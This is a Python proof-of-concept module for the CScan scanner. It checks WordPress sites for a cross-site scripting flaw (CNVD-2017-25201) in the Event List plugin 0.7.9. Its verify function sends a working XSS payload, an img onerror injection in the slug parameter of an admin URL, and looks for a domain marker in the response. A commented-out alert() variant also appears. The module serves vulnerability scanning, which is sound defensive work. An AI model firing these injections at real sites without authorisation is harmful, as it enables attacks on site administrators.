# coding: utf-8

import urllib.request
import urllib.error
import urllib.parse
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_1000'  # 平台漏洞编号，留空
    name = 'WordPress Event List插件跨站脚本漏洞(需要登陆)'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2017-09-05'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    "WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。Event List是其中的一个事件清单插件。
    WordPress Event List插件0.7.9版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。"
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-25201'  # 漏洞来源
    cnvd_id = 'CNVD-2017-25201'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '0.7.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '012eeaf8-09dd-4405-96fc-dbc2f0e88bee'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
            target=self.target, vuln=self.vuln))

        try:
            domain_target = urllib.parse.urlparse(self.target).netloc
            #path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(target=self.target)
            #让js执行domain，对domain进行验证
            url = '%s/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=document.getElementsByTagName("body")[0].innerHTML = document.domain+"cert";' % self.target
            r = requests.get(url)
            _result = domain_target + 'cert'

            if _result in r.text:
                self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
